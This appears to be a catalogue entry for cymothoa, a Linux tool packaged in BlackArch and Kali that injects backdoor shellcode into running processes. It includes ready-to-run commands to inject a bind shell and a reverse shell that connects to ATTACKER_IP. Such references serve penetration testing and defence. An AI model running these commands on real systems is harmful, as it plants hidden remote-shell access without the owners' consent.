---
name: "cymothoa"
categories:
  - blackarch-backdoor
version: "1"
homepage: "http://cymothoa.sourceforge.net/"
packaged-by: [blackarch, kali]
blackarch-builddate: "2018-11-12"
build-system: make
license: GPL2
meta-checked: "2026-11-09"
github-repo: "akpotter/cymothoa"
github-stars: 18
github-pushed: "2015-08-24"
github-archived: false
github-issues: 0
github-match: "search"
gh-checked: "2026-11-07"
worth: 2.1
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 0
gh-activity-checked: "2026-11-09"
---

# cymothoa

> Inject backdoor shellcode into an already-running process on a Linux host, leaving no new files on disk.

## What it's for

Cymothoa is a stealth backdooring tool for Linux/Unix: instead of planting a new executable, it writes shellcode directly into the memory of a live process (by default into an executable mapping of `/lib/ld`, chosen via `/proc/<pid>/maps`), so the implant exists only inside a legitimate process. Its payload set covers bind and reverse `/bin/sh` shells, password-protected bind shells, and scheduled backdoors that re-arm via `alarm()` or `setitimer()` timers. It is fileless by nature and very lightweight, but it is a 2011-era project: expect 32/64-bit and library-matching constraints, and root (or ownership of the target process) is needed to write into another process's memory. It is Linux-only — not a Windows tool — and pairs with its `udp_server` helper for some payload types.

## Typical use cases

### List the available shellcodes

See the numbered payload set before injecting.

```
cymothoa -S
```

Outcome: prints every built-in shellcode with its index and requirements — e.g. bind `/bin/sh` variants that need `-y <port>`, a connect-back payload that needs `-x <ip> -y <port>`, and timer-scheduled backdoors — which is the number you then pass to `-s`.

### Inject a bind shell into a running process

Get a fileless shell inside an existing legitimate process.

```
cymothoa -p 4242 -s 1 -y 4444
```

Outcome: shellcode #1 (bind `/bin/sh` + `fork()`) is written into an executable memory region of PID 4242; when triggered, the process serves a root `/bin/sh` on port 4444 with no new files or processes attributable to the backdoor. Run `cymothoa -h` for options to change the injection region (`-l`) or threading/fork behaviour.

### Inject a reverse shell into a running process

Have the compromised process call back to your listener instead of opening a port.

```
cymothoa -p 4242 -s 4 -x ATTACKER_IP -y 4444
```

Outcome: shellcode #4 (`/bin/sh` connect-back) is injected into PID 4242 and connects to ATTACKER_IP:4444 when it fires, handing the shell to whatever listener (e.g. nc) you have waiting there.

*No corpus evidence — derived from upstream documentation.*
